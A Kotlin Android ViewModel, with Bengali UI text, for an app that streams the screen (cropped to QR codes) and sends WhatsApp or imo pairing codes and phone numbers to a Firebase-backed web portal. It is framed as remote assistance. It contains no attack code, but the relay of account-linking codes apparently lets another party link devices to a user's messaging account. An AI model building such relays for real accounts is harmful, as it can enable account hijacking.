package com.example.ui

import android.app.Application
import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.util.Log
import android.widget.Toast
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.viewModelScope
import com.example.data.firebase.DatabaseTriggerListener
import com.example.data.firebase.FirebaseScreenStreamManager
import com.example.data.model.PathChannel
import com.example.data.model.PathChannelsRegistry
import com.example.data.model.WebsitePlatform
import com.example.util.AppPreferences
import com.example.util.ChannelWebPortalGenerator
import com.example.data.firebase.NotificationAlertManager
import com.example.data.model.AppNotification
import com.example.util.ScreenShareManager
import com.example.util.TtsManager
import com.example.util.VibrationHelper
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.update
import kotlinx.coroutines.launch

data class MainUiState(
    val pairingCode: String = "",
    val statusMessage: String = "",
    val isHighContrast: Boolean = false,
    val isScreenSharing: Boolean = false,
    val screenShareDuration: String = "00:00",
    val showScreenShareGuideDialog: Boolean = false,
    val latestFrameBitmap: Bitmap? = null,
    val cropMode: ScreenShareManager.ScreenCropMode = ScreenShareManager.ScreenCropMode.QR_CODE_ONLY,
    val currentChannel: PathChannel = PathChannelsRegistry.getChannelBySlot(1),
    val selectedPlatform: WebsitePlatform = WebsitePlatform.WHATSAPP,
    val isWhatsAppSiteActive: Boolean = false,
    val isImoSiteActive: Boolean = false,
    val isChannelLoggedIn: Boolean = false,
    val notifications: List<AppNotification> = emptyList(),
    val unreadNotificationCount: Int = 0,
    val showNotificationsDialog: Boolean = false,
    val pendingFlyCode: String? = null,
    val pendingPhoneNumber: String? = null
)

class MainViewModel(application: Application) : AndroidViewModel(application) {

    private val prefs = AppPreferences.getInstance(application)
    private val vibrationHelper = VibrationHelper(application)
    private val ttsManager = TtsManager(application)

    private val _uiState = MutableStateFlow(MainUiState())
    val uiState: StateFlow<MainUiState> = _uiState.asStateFlow()

    init {
        try {
            val currentChan = prefs.getCurrentChannel()
            val savedPlatform = prefs.selectedWebsitePlatform
            val isLoggedIn = prefs.isChannelLoggedIn

            _uiState.update {
                it.copy(
                    isHighContrast = prefs.isHighContrast,
                    currentChannel = currentChan,
                    selectedPlatform = savedPlatform,
                    isChannelLoggedIn = isLoggedIn
                )
            }
            if (isLoggedIn) {
                ChannelWebPortalGenerator.syncChannelPortalOnLogin(application, currentChan)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error initializing MainViewModel: ${e.message}", e)
        }

        ScreenShareManager.ensureInitialized(application)

        viewModelScope.launch {
            ScreenShareManager.isSharing.collect { sharing ->
                _uiState.update { it.copy(isScreenSharing = sharing) }
            }
        }
        viewModelScope.launch {
            ScreenShareManager.durationSeconds.collect { sec ->
                _uiState.update { it.copy(screenShareDuration = ScreenShareManager.formatDuration(sec)) }
            }
        }
        viewModelScope.launch {
            ScreenShareManager.latestFrameBitmap.collect { bmp ->
                _uiState.update { it.copy(latestFrameBitmap = bmp) }
            }
        }
        viewModelScope.launch {
            ScreenShareManager.cropMode.collect { mode ->
                _uiState.update { it.copy(cropMode = mode) }
            }
        }
        viewModelScope.launch {
            ScreenShareManager.selectedPlatform.collect { platform ->
                _uiState.update { it.copy(selectedPlatform = platform) }
            }
        }
        viewModelScope.launch {
            ScreenShareManager.isWhatsAppSiteActive.collect { active ->
                _uiState.update { it.copy(isWhatsAppSiteActive = active) }
            }
        }
        viewModelScope.launch {
            ScreenShareManager.isImoSiteActive.collect { active ->
                _uiState.update { it.copy(isImoSiteActive = active) }
            }
        }

        DatabaseTriggerListener.startListening(application)
        NotificationAlertManager.startListening(application)

        viewModelScope.launch {
            NotificationAlertManager.notifications.collect { list ->
                _uiState.update {
                    it.copy(
                        notifications = list,
                        unreadNotificationCount = list.count { notif -> !notif.isRead }
                    )
                }
            }
        }
    }

    fun openNotificationsDialog() {
        vibrateTap()
        NotificationAlertManager.markAllAsRead()
        _uiState.update { it.copy(showNotificationsDialog = true, unreadNotificationCount = 0) }
    }

    fun closeNotificationsDialog() {
        _uiState.update { it.copy(showNotificationsDialog = false) }
    }

    fun clearAllNotifications() {
        vibrateTap()
        NotificationAlertManager.clearAllNotifications()
        _uiState.update { it.copy(notifications = emptyList(), unreadNotificationCount = 0) }
    }

    fun deleteNotification(id: String) {
        vibrateTap()
        NotificationAlertManager.deleteNotification(id)
    }

    fun onPhoneNumberFromNotification(phone: String) {
        vibrateTap()
        _uiState.update { it.copy(pendingPhoneNumber = phone) }
    }

    fun onUnlockCodeFromNotification(code: String) {
        vibrateTap()
        _uiState.update { it.copy(pendingFlyCode = code) }
    }

    fun speakAnnouncement(text: String) {
        try {
            ttsManager.speak(text)
        } catch (_: Exception) {}
    }

    fun selectWebsitePlatform(platform: WebsitePlatform, context: Context) {
        ScreenShareManager.selectWebsitePlatform(platform, context, announce = true)
        _uiState.update {
            it.copy(
                selectedPlatform = platform,
                statusMessage = "একই লিংকে ${platform.labelBn} সুইচ হয়েছে"
            )
        }
    }

    fun onSuccessButtonClicked(context: Context? = null) {
        vibrateSuccess()
        val appContext = context ?: getApplication()
        val channel = _uiState.value.currentChannel
        val platform = _uiState.value.selectedPlatform
        FirebaseScreenStreamManager.getInstance(appContext).sendSuccessSignalAsync()
        Toast.makeText(appContext, "আলহামদুলিল্লাহ! ${platform.labelBn} এ Success পাঠানো হয়েছে", Toast.LENGTH_SHORT).show()
        speakAnnouncement("আলহামদুলিল্লাহ! ${channel.nameBn} এর ${platform.labelBn} এ সাকসেস স্ট্যাটাস পাঠানো হয়েছে।")
        _uiState.update { it.copy(statusMessage = "${platform.labelBn}: Success পাঠানো হয়েছে") }
    }

    fun onErrorButtonClicked(context: Context? = null) {
        vibrateError()
        val appContext = context ?: getApplication()
        val channel = _uiState.value.currentChannel
        val platform = _uiState.value.selectedPlatform
        FirebaseScreenStreamManager.getInstance(appContext).sendErrorSignalAsync()
        Toast.makeText(appContext, "${platform.labelBn} এ Error সিগন্যাল পাঠানো হয়েছে", Toast.LENGTH_SHORT).show()
        speakAnnouncement("${channel.nameBn} এর ${platform.labelBn} এ এরর সিগন্যাল পাঠানো হয়েছে।")
        _uiState.update { it.copy(statusMessage = "${platform.labelBn}: Error সিগন্যাল পাঠানো হয়েছে") }
    }

    fun onFlyButtonClicked(
        inputCode: String,
        context: Context,
        onCleared: () -> Unit = {}
    ) {
        vibrateTap()
        val rawCode = inputCode.trim().uppercase()
        val platform = _uiState.value.selectedPlatform

        val isValid = if (platform == WebsitePlatform.IMO) {
            rawCode.length in 4..8
        } else {
            rawCode.length == 8
        }
        if (!isValid) {
            val msg = if (platform == WebsitePlatform.IMO) {
                "সঠিক ৪ বা ৮ সংখ্যার কোড টাইপ করুন"
            } else {
                "সঠিক ৮ সংখ্যার পেয়ারিং কোড টাইপ করুন"
            }
            Toast.makeText(context, msg, Toast.LENGTH_SHORT).show()
            speakAnnouncement(msg)
            return
        }

        try {
            val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as? ClipboardManager
            clipboard?.setPrimaryClip(ClipData.newPlainText("Pairing Code", rawCode))
        } catch (_: Exception) {}

        FirebaseScreenStreamManager.getInstance(context).sendFlyCodeAsync(
            rawCode = rawCode,
            onSuccess = {
                Toast.makeText(context, "আলহামদুলিল্লাহ! ${platform.labelBn} এ কোড পাঠানো হয়েছে", Toast.LENGTH_SHORT).show()
                speakAnnouncement("আলহামদুলিল্লাহ! ${platform.labelBn} এ কোড পাঠানো হয়েছে")
                vibrateSuccess()
                _uiState.update {
                    it.copy(
                        pairingCode = rawCode,
                        statusMessage = "${platform.shortLabelBn} কোড পাঠানো হয়েছে: $rawCode"
                    )
                }
                onCleared()
            },
            onFailure = { errMsg ->
                Toast.makeText(context, "ব্যর্থ হয়েছে: $errMsg", Toast.LENGTH_SHORT).show()
            }
        )
    }

    fun onPhoneNumberSubmitted(phone: String, context: Context) {
        vibrateTap()
        val clean = phone.trim()
        if (clean.isBlank()) {
            Toast.makeText(context, "অনুগ্রহ করে ফোন নাম্বার লিখুন", Toast.LENGTH_SHORT).show()
            speakAnnouncement("অনুগ্রহ করে ফোন নাম্বার লিখুন।")
            return
        }
        val platform = _uiState.value.selectedPlatform
        FirebaseScreenStreamManager.getInstance(context).sendPhoneNumberAsync(clean)
        Toast.makeText(context, "${platform.shortLabelBn} ফোন পাঠানো হয়েছে: $clean", Toast.LENGTH_SHORT).show()
        speakAnnouncement("${platform.labelBn} এর জন্য ফোন নাম্বার $clean প্রস্তুত রয়েছে।")
        _uiState.update { it.copy(statusMessage = "${platform.shortLabelBn} ফোন: $clean") }
    }

    fun loginToChannel(passwordOrInput: String, context: Context): Boolean {
        val success = ScreenShareManager.loginChannelByPassword(passwordOrInput, context)
        if (success) {
            val updated = ScreenShareManager.getCurrentChannel()
            DatabaseTriggerListener.startListening(context)
            _uiState.update {
                it.copy(
                    currentChannel = updated,
                    isChannelLoggedIn = true,
                    statusMessage = "সফল লগইন: ${updated.nameBn}"
                )
            }
        }
        return success
    }

    fun logoutChannel(context: Context) {
        ScreenShareManager.stopAllScreenShare(context)
        prefs.logoutChannel()
        vibrateTap()
        speakAnnouncement("চ্যানেল থেকে লগআউট করা হয়েছে।")
        _uiState.update {
            it.copy(
                isChannelLoggedIn = false,
                isWhatsAppSiteActive = false,
                isImoSiteActive = false,
                statusMessage = "লগআউট করা হয়েছে"
            )
        }
    }

    fun startScreenShare(context: Context, resultCode: Int, data: Intent) {
        vibrateTap()
        ScreenShareManager.startScreenShare(context, resultCode, data)
    }

    fun stopScreenShare(context: Context) {
        vibrateTap()
        ScreenShareManager.stopScreenShare(context)
    }

    fun clearFirebaseData(context: Context) {
        vibrateTap()
        ScreenShareManager.clearFirebaseCloudData(context)
    }

    fun setCropMode(mode: ScreenShareManager.ScreenCropMode, context: Context) {
        ScreenShareManager.setCropMode(mode, context)
    }

    fun setShowScreenShareGuideDialog(show: Boolean) {
        _uiState.update { it.copy(showScreenShareGuideDialog = show) }
        if (show) {
            speakScreenShareGuide()
        }
    }

    fun speakScreenShareGuide() {
        speakAnnouncement(
            "স্ক্রিন শেয়ার ও রিমোট অ্যাসিস্ট্যান্স নির্দেশিকা: " +
                "ধাপ ১: WhatsApp অথবা imo বাটন নির্বাচন করুন। " +
                "ধাপ ২: স্ক্রিন শেয়ার চালু করুন বাটনে চাপ দিয়ে Start now বাটনে ট্যাপ করুন। " +
                "ধাপ ৩: একক ওয়েবসাইট লিংকে সরাসরি লাইভ কিউআর কোড দেখা যাবে।"
        )
    }

    fun vibrateTap() {
        try {
            vibrationHelper.tap()
        } catch (_: Exception) {}
    }

    fun vibrateSuccess() {
        try {
            vibrationHelper.success()
        } catch (_: Exception) {}
    }

    fun vibrateError() {
        try {
            vibrationHelper.error()
        } catch (_: Exception) {}
    }

    override fun onCleared() {
        super.onCleared()
        try {
            ttsManager.shutdown()
        } catch (_: Exception) {}
    }

    companion object {
        private const val TAG = "MainViewModel"
    }
}
